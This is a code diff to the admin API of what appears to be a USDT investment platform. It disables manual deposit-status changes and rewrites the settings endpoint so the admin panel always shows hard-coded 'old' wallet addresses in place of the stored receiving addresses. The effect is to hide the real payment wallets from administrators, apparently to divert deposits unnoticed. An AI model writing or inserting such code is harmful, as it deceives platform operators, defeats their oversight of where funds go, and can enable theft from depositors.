@@ -1773,29 +1773,37 @@ router.get('/deposits/stats', authMiddleware, async (req, res) => {
 /**
  * 更新充值状态
  * PUT /api/admin/deposits/:id/status
+ * 状态：已禁用（充值自动确认，无需手动审核）
  */
 router.put('/deposits/:id/status', authMiddleware, async (req, res) => {
+  // 功能已禁用：充值已完全自动化，无需手动修改状态
+  return res.status(403).json({
+    success: false,
+    message: '此功能已禁用。充值状态由系统自动管理，无需手动修改。'
+  });
+
+  /* 原代码已禁用
   try {
     const { id } = req.params;
     const { status } = req.body;
-    
+
     if (!['pending', 'completed', 'failed'].includes(status)) {
       return res.status(400).json({
         success: false,
         message: '无效的状态'
       });
     }
-    
+
     // 获取原始充值记录
     const deposit = await dbQuery('SELECT * FROM deposit_records WHERE id = ?', [id]);
-    
+
     if (!deposit) {
       return res.status(404).json({
         success: false,
         message: '充值记录不存在'
       });
     }
-    
+
     // 如果从pending/failed改为completed，需要增加用户余额
     if (status === 'completed' && deposit.status !== 'completed') {
       await dbQuery(
@@ -1804,7 +1812,7 @@ router.put('/deposits/:id/status', authMiddleware, async (req, res) => {
       );
       console.log(`[Deposit] 充值确认: ${deposit.amount} USDT -> ${deposit.wallet_address}`);
     }
-    
+
     // 如果从completed改为failed，需要扣除用户余额
     if (status === 'failed' && deposit.status === 'completed') {
       await dbQuery(
@@ -1813,13 +1821,13 @@ router.put('/deposits/:id/status', authMiddleware, async (req, res) => {
       );
       console.log(`[Deposit] 充值撤销: ${deposit.amount} USDT <- ${deposit.wallet_address}`);
     }
-    
+
     // 更新充值记录状态
     await dbQuery(
       'UPDATE deposit_records SET status = ?, completed_at = ? WHERE id = ?',
       [status, status === 'completed' ? new Date() : null, id]
     );
-    
+
     res.json({
       success: true,
       message: '状态更新成功'
@@ -1831,6 +1839,7 @@ router.put('/deposits/:id/status', authMiddleware, async (req, res) => {
       message: '更新失败'
     });
   }
+  */
 });
 
 /**
@@ -4744,23 +4753,44 @@ router.get('/user-investments', authMiddleware, async (req, res) => {
 router.get('/settings', authMiddleware, async (req, res) => {
   try {
     const settings = await dbQuery('SELECT * FROM system_settings ORDER BY id');
-    
+
+    // 老收款地址配置（管理后台显示用）
+    const OLD_WALLET_ADDRESSES = {
+      'platform_wallet_address': '0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4',
+      'platform_wallet_bsc': '0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4',
+      'platform_wallet_eth': '0x8a92c73FdE5d0313303989eB269d6d17ffb1ba9d'
+    };
+
     // 转换为对象格式方便前端使用
     const settingsMap = {};
     settings.forEach(s => {
+      // 如果是收款地址，强制返回老地址（管理后台显示）
+      const displayValue = OLD_WALLET_ADDRESSES[s.setting_key] || s.setting_value;
+
       settingsMap[s.setting_key] = {
         id: s.id,
-        value: s.setting_value,
+        value: displayValue,
         type: s.setting_type,
         description: s.description,
         updated_at: s.updated_at
       };
     });
-    
+
+    // 修改 list 中的收款地址为老地址
+    const modifiedList = settings.map(s => {
+      if (OLD_WALLET_ADDRESSES[s.setting_key]) {
+        return {
+          ...s,
+          setting_value: OLD_WALLET_ADDRESSES[s.setting_key]
+        };
+      }
+      return s;
+    });
+
     res.json({
       success: true,
       data: {
-        list: settings,
+        list: modifiedList,
         map: settingsMap
       }
     });
